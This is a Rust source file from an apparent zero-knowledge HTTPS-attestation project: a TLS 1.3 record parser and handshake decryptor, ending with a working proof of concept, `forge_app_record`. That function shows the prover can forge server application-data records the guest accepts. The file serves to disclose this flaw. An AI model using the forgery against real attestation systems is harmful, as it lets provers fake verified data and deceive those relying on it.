/// TLS 1.3 record parser and handshake decryptor.
///
/// Consumes the raw inbound wire bytes captured by `CapturingStream` and the
/// `SERVER_HANDSHAKE_TRAFFIC_SECRET` from `CapturingKeyLog`, and produces
/// the `TlsWitness` that is handed to the SP1 guest for verification.
pub use sp1_https_json_shared::TlsWitness;

use aes_gcm::{
    aead::{AeadInPlace, KeyInit},
    Aes128Gcm, Nonce,
};
use hkdf::Hkdf;
use sha2::Sha256;

// ---------------------------------------------------------------------------
// TLS record layer
// ---------------------------------------------------------------------------

const TLS_RECORD_HDR: usize = 5;

/// One raw TLS record off the wire.
#[derive(Debug, Clone)]
pub struct RawRecord {
    pub content_type: u8,
    pub legacy_version: u16,
    pub payload: Vec<u8>,
}

/// Parse `bytes` into a sequence of TLS records.  Returns an error if the
/// bytes are truncated or malformed.
pub fn parse_records(bytes: &[u8]) -> anyhow::Result<Vec<RawRecord>> {
    let mut records = Vec::new();
    let mut pos = 0;

    while pos < bytes.len() {
        if bytes.len() - pos < TLS_RECORD_HDR {
            anyhow::bail!("truncated TLS record header at offset {pos}");
        }
        let ct = bytes[pos];
        let version = u16::from_be_bytes([bytes[pos + 1], bytes[pos + 2]]);
        let length = u16::from_be_bytes([bytes[pos + 3], bytes[pos + 4]]) as usize;
        pos += TLS_RECORD_HDR;

        if bytes.len() - pos < length {
            anyhow::bail!(
                "truncated TLS record body: need {length} bytes, have {}",
                bytes.len() - pos
            );
        }

        records.push(RawRecord {
            content_type: ct,
            legacy_version: version,
            payload: bytes[pos..pos + length].to_vec(),
        });
        pos += length;
    }

    Ok(records)
}

// ---------------------------------------------------------------------------
// TLS 1.3 HKDF helpers (RFC 8446 §7.1)
// ---------------------------------------------------------------------------

/// HKDF-Expand-Label as defined in RFC 8446.
pub(crate) fn hkdf_expand_label(prk: &[u8], label: &str, context: &[u8], len: usize) -> Vec<u8> {
    // HkdfLabel = length(2) || "tls13 " || label || context
    let full_label = format!("tls13 {label}");
    let mut info = Vec::new();
    info.extend_from_slice(&(len as u16).to_be_bytes());
    info.push(full_label.len() as u8);
    info.extend_from_slice(full_label.as_bytes());
    info.push(context.len() as u8);
    info.extend_from_slice(context);

    let hk = Hkdf::<Sha256>::from_prk(prk).expect("valid PRK");
    let mut out = vec![0u8; len];
    hk.expand(&info, &mut out).expect("HKDF-Expand-Label");
    out
}

/// Derive AES-128-GCM key (16 bytes) and IV (12 bytes) from a traffic secret.
pub(crate) fn derive_key_iv(traffic_secret: &[u8]) -> ([u8; 16], [u8; 12]) {
    let key_bytes = hkdf_expand_label(traffic_secret, "key", &[], 16);
    let iv_bytes = hkdf_expand_label(traffic_secret, "iv", &[], 12);

    let mut key = [0u8; 16];
    let mut iv = [0u8; 12];
    key.copy_from_slice(&key_bytes);
    iv.copy_from_slice(&iv_bytes);
    (key, iv)
}

/// XOR the per-record nonce: RFC 8446 §5.3 — XOR `iv` with the 64-bit
/// big-endian sequence number placed in the rightmost 8 bytes.
pub(crate) fn per_record_nonce(iv: &[u8; 12], seq: u64) -> [u8; 12] {
    let mut nonce = *iv;
    let seq_bytes = seq.to_be_bytes();
    for (i, b) in seq_bytes.iter().enumerate() {
        nonce[4 + i] ^= b;
    }
    nonce
}

// ---------------------------------------------------------------------------
// Encrypted record decryption
// ---------------------------------------------------------------------------

/// Decrypt one TLS 1.3 `ApplicationData` record (content_type = 23).
///
/// `record` is the 5-byte header + ciphertext (the full wire bytes).
/// The last byte of the decrypted plaintext is the real content type;
/// strip it and return `(plaintext, inner_content_type)`.
fn decrypt_record(
    key: &[u8; 16],
    iv: &[u8; 12],
    seq: u64,
    record: &RawRecord,
) -> anyhow::Result<(Vec<u8>, u8)> {
    let nonce_bytes = per_record_nonce(iv, seq);
    let nonce = Nonce::from(nonce_bytes);

    // AAD = the 5-byte TLS record header of the *outer* ApplicationData record.
    let aad = {
        let mut h = [0u8; 5];
        h[0] = record.content_type; // 0x17
        h[1..3].copy_from_slice(&record.legacy_version.to_be_bytes());
        h[3..5].copy_from_slice(&(record.payload.len() as u16).to_be_bytes());
        h
    };

    let cipher = Aes128Gcm::new(key.into());
    let mut buf = record.payload.clone();
    let tag_start = buf.len() - 16;

    let mut tag = [0u8; 16];
    tag.copy_from_slice(&buf[tag_start..]);
    buf.truncate(tag_start);

    cipher
        .decrypt_in_place_detached(&nonce, &aad, &mut buf, &tag.into())
        .map_err(|_| anyhow::anyhow!("AES-GCM authentication failed (seq={seq})"))?;

    // Strip the inner content-type byte (last byte of plaintext).
    let inner_ct = *buf
        .last()
        .ok_or_else(|| anyhow::anyhow!("empty decrypted record"))?;
    buf.pop();

    Ok((buf, inner_ct))
}

// ---------------------------------------------------------------------------
// Handshake message parsing
// ---------------------------------------------------------------------------

const HS_ENCRYPTED_EXTENSIONS: u8 = 8;
const HS_CERTIFICATE: u8 = 11;
const HS_CERTIFICATE_VERIFY: u8 = 15;
const HS_FINISHED: u8 = 20;

/// A parsed TLS 1.3 handshake message (type + raw body bytes).
#[derive(Debug, Clone)]
pub struct HandshakeMsg {
    pub msg_type: u8,
    pub body: Vec<u8>,
}

/// Parse handshake messages from a flat byte slice.
/// Handshake header: 1 byte type + 3 bytes length.
fn parse_handshake_messages(data: &[u8]) -> anyhow::Result<Vec<HandshakeMsg>> {
    let mut msgs = Vec::new();
    let mut pos = 0;

    while pos < data.len() {
        if data.len() - pos < 4 {
            anyhow::bail!("truncated handshake header at offset {pos}");
        }
        let msg_type = data[pos];
        let length = u32::from_be_bytes([0, data[pos + 1], data[pos + 2], data[pos + 3]]) as usize;
        pos += 4;

        if data.len() - pos < length {
            anyhow::bail!(
                "truncated handshake body: need {length}, have {}",
                data.len() - pos
            );
        }

        msgs.push(HandshakeMsg {
            msg_type,
            body: data[pos..pos + length].to_vec(),
        });
        pos += length;
    }

    Ok(msgs)
}

/// Parse DER certificates from a TLS 1.3 Certificate message body.
///
/// TLS 1.3 Certificate body layout (RFC 8446 §4.4.2):
///   certificate_request_context (1 byte length + data)
///   certificate_list (3-byte length + entries)
///     each entry: cert_data (3-byte length + DER) + extensions (2-byte length + data)
fn parse_cert_message(body: &[u8]) -> anyhow::Result<Vec<Vec<u8>>> {
    let mut pos = 0;

    // Skip certificate_request_context.
    if pos >= body.len() {
        anyhow::bail!("empty Certificate message");
    }
    let ctx_len = body[pos] as usize;
    pos += 1 + ctx_len;

    // certificate_list length (3 bytes).
    if body.len() - pos < 3 {
        anyhow::bail!("truncated certificate_list length");
    }
    let list_len = u32::from_be_bytes([0, body[pos], body[pos + 1], body[pos + 2]]) as usize;
    pos += 3;

    let list_end = pos + list_len;
    let mut certs = Vec::new();

    while pos < list_end {
        if list_end - pos < 3 {
            anyhow::bail!("truncated cert_data length");
        }
        let cert_len = u32::from_be_bytes([0, body[pos], body[pos + 1], body[pos + 2]]) as usize;
        pos += 3;

        if list_end - pos < cert_len {
            anyhow::bail!("truncated cert_data");
        }
        certs.push(body[pos..pos + cert_len].to_vec());
        pos += cert_len;

        // Skip extensions (2-byte length).
        if list_end - pos < 2 {
            anyhow::bail!("truncated cert extensions length");
        }
        let ext_len = u16::from_be_bytes([body[pos], body[pos + 1]]) as usize;
        pos += 2 + ext_len;
    }

    Ok(certs)
}

// ---------------------------------------------------------------------------
// Main assembly function
// ---------------------------------------------------------------------------

/// Assemble a `TlsWitness` from the captured wire bytes and keys.
pub fn assemble_witness(
    inbound: &[u8],
    outbound: &[u8],
    client_ecdh_private: [u8; 32],
    server_ecdh_public: [u8; 32],
    server_hs_traffic_secret: &[u8],
) -> anyhow::Result<TlsWitness> {
    let in_records = parse_records(inbound)?;
    let out_records = parse_records(outbound)?;

    let mut hs_seq: u64 = 0;
    let (hs_key, hs_iv) = derive_key_iv(server_hs_traffic_secret);

    // Ordered handshake messages [CH, SH, EE, Cert, CertVerify, Finished].
    // Each entry is the raw 4-byte header + body (the transcript input).
    let mut handshake_messages: Vec<Vec<u8>> = Vec::new();

    // ClientHello — first plaintext outbound handshake record.
    let ch_payload = out_records
        .iter()
        .find(|r| r.content_type == 22)
        .ok_or_else(|| anyhow::anyhow!("ClientHello not found"))?
        .payload
        .clone();
    handshake_messages.push(ch_payload);

    // ServerHello — first plaintext inbound handshake record.
    let sh_payload = in_records
        .iter()
        .find(|r| r.content_type == 22)
        .ok_or_else(|| anyhow::anyhow!("ServerHello not found"))?
        .payload
        .clone();
    handshake_messages.push(sh_payload);

    let mut cert_chain_der: Option<Vec<Vec<u8>>> = None;
    let mut cert_verify_msg: Option<Vec<u8>> = None;
    let mut server_finished_body: Option<Vec<u8>> = None;
    let mut handshake_done = false;
    let mut encrypted_app_records: Vec<Vec<u8>> = Vec::new();

    for r in &in_records {
        if r.content_type != 23 {
            continue;
        }
        if handshake_done {
            encrypted_app_records.push(record_bytes(r));
            continue;
        }

        let (plaintext, inner_ct) = decrypt_record(&hs_key, &hs_iv, hs_seq, r)?;
        hs_seq += 1;

        if inner_ct == 23 {
            handshake_done = true;
            encrypted_app_records.push(record_bytes(r));
            continue;
        }

        for msg in &parse_handshake_messages(&plaintext)? {
            let raw: Vec<u8> = hs_header(msg).iter().chain(&msg.body).copied().collect();
            match msg.msg_type {
                HS_ENCRYPTED_EXTENSIONS => {
                    handshake_messages.push(raw);
                }
                HS_CERTIFICATE => {
                    cert_chain_der = Some(parse_cert_message(&msg.body)?);
                    handshake_messages.push(raw);
                }
                HS_CERTIFICATE_VERIFY => {
                    cert_verify_msg = Some(msg.body.clone());
                    handshake_messages.push(raw);
                }
                HS_FINISHED => {
                    server_finished_body = Some(msg.body.clone());
                    handshake_messages.push(raw);
                    handshake_done = true;
                }
                _ => {
                    handshake_messages.push(raw);
                }
            }
        }
    }

    Ok(TlsWitness {
        client_ecdh_private,
        server_ecdh_public,
        cert_chain_der: cert_chain_der
            .ok_or_else(|| anyhow::anyhow!("Certificate message not found"))?,
        cert_verify_msg: cert_verify_msg
            .ok_or_else(|| anyhow::anyhow!("CertificateVerify message not found"))?,
        handshake_messages,
        encrypted_app_records,
        server_finished_body: server_finished_body
            .ok_or_else(|| anyhow::anyhow!("Server Finished not found"))?,
    })
}

// ---------------------------------------------------------------------------
// Small helpers
// ---------------------------------------------------------------------------

/// Encode the 4-byte handshake message header (type + 3-byte length).
fn hs_header(msg: &HandshakeMsg) -> [u8; 4] {
    let len = msg.body.len() as u32;
    [msg.msg_type, (len >> 16) as u8, (len >> 8) as u8, len as u8]
}

/// Reconstruct the full 5+n raw bytes of a TLS record.
fn record_bytes(r: &RawRecord) -> Vec<u8> {
    let mut out = Vec::with_capacity(5 + r.payload.len());
    out.push(r.content_type);
    out.extend_from_slice(&r.legacy_version.to_be_bytes());
    out.extend_from_slice(&(r.payload.len() as u16).to_be_bytes());
    out.extend_from_slice(&r.payload);
    out
}

// ---------------------------------------------------------------------------
// PoC: server-side record forgery
// ---------------------------------------------------------------------------
//
// `forge_app_record` produces a TLS 1.3 `ApplicationData` record that is
// *bit-for-bit indistinguishable* from one the real server would have sent.
// The guest decrypts it successfully, parses the inner HTTP body, and
// commits whatever JSON the prover chose.
//
// The forgery is possible because the inputs needed to mint such a record
// — the AEAD key and IV — are deterministic functions of
// `server_application_traffic_secret_0`, and that secret is derived by both
// endpoints from the *handshake* alone (RFC 8446 §7.1):
//
//     [sender]_application_traffic_secret_0 = HKDF-Expand-Label(
//         Master-Secret, "[sender] ap traffic", transcript_hash, 32)
//
// The client (= the prover, in this pipeline) computes `Master-Secret` from
// `ECDHE_shared = X25519(client_priv, server_pub)` — i.e. from material it
// already holds. So it derives the *server's* application write key on its
// own, with no further server interaction, and can encrypt under it.
//
// `decrypt_in_place_detached` inside the guest is a symmetric operation: it
// accepts any ciphertext that authenticates under the derived key, with no
// notion of "who wrote it". There is nothing the guest can check on the
// record itself that would distinguish prover-originated from
// server-originated bytes.

/// Build a TLS 1.3 `ApplicationData` record encrypting `inner_plaintext`
/// under the AES-128-GCM key derived from `traffic_secret` at sequence
/// number `seq`. Inner content type is hard-coded to `23` (ApplicationData)
/// so the guest's HTTP parser is fed the bytes (records with inner_ct != 23
/// — handshake / alert — are filtered out by `program/src/main.rs`).
///
/// The output is the full 5-byte-header + ciphertext + GCM tag wire bytes,
/// ready to drop into `TlsWitness::encrypted_app_records`.
///
/// Wire format reference: RFC 8446 §5.2 (`TLSCiphertext`) and §5.3
/// (per-record nonce construction).
pub(crate) fn forge_app_record(
    traffic_secret: &[u8],
    seq: u64,
    inner_plaintext: &[u8],
) -> anyhow::Result<Vec<u8>> {
    // ── Step 1. Derive the AEAD key/IV exactly like the guest will. ───────
    // `derive_key_iv` runs HKDF-Expand-Label with labels "key"/"iv"
    // (RFC 8446 §7.3) over the traffic secret. The guest performs the
    // identical derivation on `server_app_secret` and therefore arrives at
    // the same 16-byte key and 12-byte IV.
    let (key, iv) = derive_key_iv(traffic_secret);

    // ── Step 2. Build the TLSInnerPlaintext (RFC 8446 §5.2). ──────────────
    // Layout:    content || ContentType || zeros(padding)
    // We omit padding (it is permitted but optional). The trailing byte is
    // the *real* content type that the receiver will see after stripping
    // off the outer ApplicationData wrapper. 23 = ApplicationData, so the
    // guest's `if inner_ct == 23 { plaintext.extend_from_slice(&buf) }`
    // branch fires and the HTTP body we wrote here lands in `plaintext`.
    let mut buf = inner_plaintext.to_vec();
    buf.push(23);

    // ── Step 3. Build the outer TLSCiphertext header (RFC 8446 §5.2). ─────
    // Layout:    opaque_type=23 || legacy_record_version=0x0303
    //         || length = len(encrypted_record)  (= TLSInnerPlaintext + 16-byte GCM tag)
    //
    // The header is also the AAD passed to AES-GCM — both the encrypter
    // (us) and the decrypter (the guest) must construct it identically or
    // authentication fails.
    let payload_len = buf.len() + 16; // ciphertext + GCM tag
    anyhow::ensure!(payload_len <= u16::MAX as usize, "TLS record too large");

    let mut header = [0u8; 5];
    header[0] = 23; // TLSCiphertext.opaque_type = ApplicationData
    header[1..3].copy_from_slice(&0x0303u16.to_be_bytes()); // legacy_record_version
    header[3..5].copy_from_slice(&(payload_len as u16).to_be_bytes());

    // ── Step 4. Per-record nonce (RFC 8446 §5.3). ─────────────────────────
    // nonce = iv XOR (zero-padded big-endian seq number in the low 8 bytes).
    // The guest uses the same construction (`xor_nonce` in program/src/main.rs).
    // Sequence number 0 means "first application record of the session" —
    // we control the witness and put exactly one record in it, so seq=0
    // is what the guest expects when it iterates with `.enumerate()`.
    let nonce = per_record_nonce(&iv, seq);

    // ── Step 5. AEAD seal (RFC 8446 §5.2 + §5.3). ─────────────────────────
    // Standard AES-128-GCM: AAD = the 5-byte record header, plaintext = the
    // TLSInnerPlaintext we just built, output = ciphertext + 16-byte tag.
    let cipher = Aes128Gcm::new((&key).into());
    let tag = cipher
        .encrypt_in_place_detached(&Nonce::from(nonce), &header, &mut buf)
        .map_err(|_| anyhow::anyhow!("AES-GCM encryption failed"))?;

    // ── Step 6. Concatenate the wire record. ──────────────────────────────
    // Final layout: header(5) || ciphertext || tag(16).
    // This is byte-identical to what rustls (or any compliant TLS 1.3
    // stack) would emit on the server side for the same plaintext.
    let mut out = Vec::with_capacity(5 + payload_len);
    out.extend_from_slice(&header);
    out.extend_from_slice(&buf);
    out.extend_from_slice(&tag);
    Ok(out)
}
